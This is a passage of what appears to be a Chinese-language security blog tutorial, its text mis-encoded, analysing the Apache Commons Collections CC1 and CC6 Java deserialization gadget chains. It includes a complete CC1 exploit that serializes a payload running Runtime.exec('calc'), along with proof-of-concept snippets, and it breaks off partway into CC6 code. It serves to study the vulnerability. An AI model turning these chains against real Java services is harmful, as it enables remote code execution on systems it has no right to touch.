<span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span><br>                , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decoratemp</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap,invokerTransformer);<br>        <span class="hljs-comment">//è¿™é‡Œå…¶å®æ˜¯å§factoryèµ‹å€¼ä¸ºinvokerTransformer</span><br>        <span class="hljs-comment">//å…¶å®æœ€ç»ˆçš„ç›®çš„è¿˜æ˜¯è°ƒç”¨invokerTransformer.transform(runtime)ï¼</span><br><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-comment">//é€šè¿‡åå°„æ‹¿åˆ°getæ–¹æ³•</span><br><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getmethod</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredMethod(<span class="hljs-string">&quot;get&quot;</span>, Object.class);<br><br>        getmethod.setAccessible(<span class="hljs-literal">true</span>);<br><br>        getmethod.invoke(decoratemp,runtime);<br>        <span class="hljs-comment">//ç„¶åæ³¨æ„è¿™é‡Œçš„ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªdecoratempï¼Œå…¶å®å°±æ˜¯åœ¨å®ƒä¸Šé¢è°ƒç”¨è¿™ä¸ªgetæ–¹æ³•ã€‚ç„¶åå¾—çŸ¥é“å‚æ•°å°±æ˜¯runtime()[å³transformçš„å‚æ•°æ˜¯runtime]</span><br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ChainedTransformeråŒ…è£…æˆLazyMapï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬åˆ©ç”¨getå»è§¦å‘</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Lazy1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-comment">//create chain</span><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//LazyMap</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">lazyM</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(hashMap, transformerChain);<br>        <span class="hljs-comment">//poc</span><br>        lazyM.get(<span class="hljs-string">&quot;foo&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™ä¸ªgetçš„å€¼éšä¾¿å†™å°±è¡Œï¼Œå› ä¸ºè°ƒç”¨ LazyMap çš„ get æ–¹æ³•æ—¶ï¼Œå¦‚æœè¯¥é”®å¯¹åº”çš„å€¼ä¸å­˜åœ¨ï¼ŒLazyMap ä¼šæ ¹æ®é”®å’Œ Transformer  é“¾ç”Ÿæˆä¸€ä¸ªæ–°çš„å€¼ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼ŒLazyMap ä¼šä¾æ¬¡åº”ç”¨ Transformer é“¾ä¸­çš„æ¯ä¸€ä¸ª Transformer å¯¹è±¡ï¼Œå°†å‰ä¸€ä¸ª  Transformer çš„è¾“å‡ºä½œä¸ºåä¸€ä¸ª Transformer çš„è¾“å…¥ï¼Œæœ€ç»ˆç”Ÿæˆå€¼ã€‚è™½ç„¶åé¢transform()é‡Œé¢è¦æ”¾ä¸ªå¯¹è±¡è¿›å»ï¼Œä¸è¿‡ç”±äºConstantTransformerçš„å­˜åœ¨æœ€ç»ˆè¿˜æ˜¯å˜æˆ<code>Runtime</code>ï¼Œåé¢å°±æ˜¯é‚£ä¸ªé“¾å¼ååº”ã€‚</p>
<p>è¿™è¿™ä¸œè¥¿æ‰“ä¸ªæ–­ç‚¹è°ƒè¯•ä¸€ä¸‹å°±çŸ¥é“äº†ï¼š</p>
<p><img src="/img/image-20240316195339864.png" srcset="/img/loading.gif" lazyload alt="image-20240316195339864"></p>
<p><code>AnnotationInvocationHandler.invoke()</code> æ–¹æ³•è°ƒç”¨äº† <code>get()</code> æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> method.getName();<br>        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();<br><br>        <span class="hljs-comment">// Handle Object and Annotation methods</span><br>        <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>            paramTypes[<span class="hljs-number">0</span>] == Object.class)<br>            <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">if</span> (paramTypes.length != <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(<span class="hljs-string">&quot;Too many parameters for an annotation method&quot;</span>);<br><br>        <span class="hljs-keyword">switch</span>(member) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;toString&quot;</span>:<br>            <span class="hljs-keyword">return</span> toStringImpl();<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hashCode&quot;</span>:<br>            <span class="hljs-keyword">return</span> hashCodeImpl();<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;annotationType&quot;</span>:<br>            <span class="hljs-keyword">return</span> type;<br>        &#125;<br><br>        <span class="hljs-comment">// Handle annotation member accessors</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);<br></code></pre></td></tr></table></figure>

<p>å¯¹æŸä¸ªå¯¹è±¡ä½¿ç”¨Proxy.newProxyInstanceè¿›è¡ŒåŠ¨æ€ä»£ç†å¹¶ä¼ å…¥æœ‰å®ç°invokeçš„ç›¸åº”hanlderå¯¹è±¡ï¼ˆæ¯”å¦‚è¿™é‡Œçš„AnnotationInvocationHandlerï¼‰ï¼Œå½“è°ƒç”¨æ–¹æ³•æ—¶ï¼Œå°±ä¼šè·³è½¬åˆ°è¿™ä¸ªhandlerå¯¹è±¡çš„invokeæ–¹æ³•ã€‚æ¥ç€æˆ‘ä»¬å†æ¥çœ‹ä¸‹è¿™ä¸ªthis.memberValuesæ˜¯å¦å¯æ§å¹¶èƒ½å¦è®¾ç½®ä¸ºLazyMapï¼ŒæŸ¥çœ‹æ„é€ å‡½æ•°ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span>, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">6182022883658399397L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; memberValues;<br><br>    AnnotationInvocationHandler(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;<br>        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();<br>        <span class="hljs-keyword">if</span> (!type.isAnnotation() ||<br>            superInterfaces.length != <span class="hljs-number">1</span> ||<br>            superInterfaces[<span class="hljs-number">0</span>] != java.lang.annotation.Annotation.class)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationFormatError</span>(<span class="hljs-string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);<br>        <span class="hljs-built_in">this</span>.type = type;<br>        <span class="hljs-built_in">this</span>.memberValues = memberValues;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p><code>memberValues</code>å¯æ§ã€‚å¯¹äº<code>invoke</code>è¿™ä¸ªæ–¹æ³•æ¥è¯´ï¼Œä¼šåœ¨ä»£ç†å¯¹è±¡çš„ä»»æ„æ–¹æ³•è¢«è°ƒç”¨æ—¶è°ƒç”¨ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject();<br><br>        <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br><br>        <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            annotationType = AnnotationType.getInstance(type);<br>        &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>            <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>        <span class="hljs-comment">// If there are annotation members without values, that</span><br>        <span class="hljs-comment">// situation is handled by the invoke method.</span><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br></code></pre></td></tr></table></figure>

<p><code>readobject</code>æ–¹æ³•ä¸­æ°å¥½å­˜åœ¨<code>for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet())</code>ã€‚è°ƒç”¨äº†memberValuesçš„<code>entrySet()</code>æ–¹æ³•ï¼Œè§¦å‘è¿™ä¸ªæ–¹æ³•çš„æ—¶å€™ä¼šè‡ªåŠ¨èµ°åˆ°<code>memberValues</code>çš„invoke()æ–¹æ³•ã€‚</p>
<p>æŠŠä¸€ä¸ªAnnotationInvocationHandlerå¯¹è±¡ä½œä¸ºLazyMapåŠ¨æ€ä»£ç†çš„handler,æœ€åå†æŠŠä»£ç†åçš„LazyMapå†èµ‹å€¼ç»™ä¸€ä¸ªæ–°çš„Annâ€¦Handler</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) ctor.newInstance(Retention.class, lazyM);<br>        <span class="hljs-comment">//set the handler for lazyM</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyLazyM</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(lazyM.getClass().getClassLoader(), lazyM.getClass().getInterfaces(),handler);<br>        <span class="hljs-comment">//set the memberValues to proxyLazyM</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> ctor.newInstance(Retention.class, proxyLazyM);<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨newinstanceå¼„äº†ä¸¤ä¸ª<code>AnnotationInvocationHandler</code>å¯¹è±¡ï¼Œå…¶å®ç¬¬ä¸€ä¸ªå°±æ˜¯æ‹¿æ¥å½“ä½œåŠ¨æ€ä»£ç†çš„<code>handler</code>çš„ã€‚ç¬¬äºŒä¸ªæ˜¯æ‹¿æ¥å½“ä»£ç†ä»¥è§¦å‘<code>readobject</code>ä¸­çš„<code>entrySet()</code>æ–¹æ³•ã€‚</p>
<p>æœ€ç»ˆEXP(å‚è€ƒäº†DBå¸ˆå‚…çš„æ–‡ç« ):</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoChainsEXP;  <br>  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// æ­£ç‰ˆ CC1 é“¾æœ€ç»ˆ EXP</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyFinalEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// æ„é€  setValue çš„å¯æ§å‚æ•°  </span><br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  <br>  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br> <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br> declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  <br>  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()  <br>                , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);  <br> invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  <br>  <br> serialize(invocationHandler);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>

<p>æœ€åæ³¨æ„invokeæ–¹æ³•çš„è¿™é‡Œï¼Œå¿…é¡»è¦è°ƒç”¨ä¸€ä¸ªæ— å‚æ–¹æ³•æ‰ä¼šèµ°åˆ°ä¸‹é¢çš„getï¼Œå¦åˆ™åœ¨ä¸­é€”ç›´æ¥returnäº†(è¿™é‡Œæˆ‘ä»¬ç”¨çš„æ˜¯<code>memberValues.entrySet()</code>)ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>            paramTypes[<span class="hljs-number">0</span>] == Object.class)<br>            <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">if</span> (paramTypes.length != <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">Gadget chain:<br>    ObjectInputStream.readObject()<br>        AnnotationInvocationHandler.readObject()<br>            Map(Proxy).entrySet()<br>                AnnotationInvocationHandler.invoke()<br>                    LazyMap.get()<br>                        ChainedTransformer.transform()<br>                            ConstantTransformer.transform()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Class.getMethod()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Runtime.getRuntime()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Runtime.exec()<br></code></pre></td></tr></table></figure>

<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>é“¾å­å°¾éƒ¨ä¸CC1ç›¸åŒï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">LazyMap.get() -&gt;  factory.transform() -&gt; InvokeTransfromer.transfrom()<br></code></pre></td></tr></table></figure>

<p>é‚£ä¹ˆè°è°ƒç”¨äº†è¿™ä¸ªgetï¼Ÿ</p>
<p><code>TiedMapEntry</code> ç±»ä¸­çš„ <code>getValue()</code> æ–¹æ³•è°ƒç”¨äº† <code>LazyMap</code> çš„ <code>get()</code> æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//TiedMapEntry.java</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> map.get(key);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>åˆ©ç”¨<code>TiedMaEntry</code>ä¸­çš„<code>getvalue()</code>æ–¹æ³•è°ƒä¸ªè®¡ç®—å™¨ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TiedMapEntryEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span 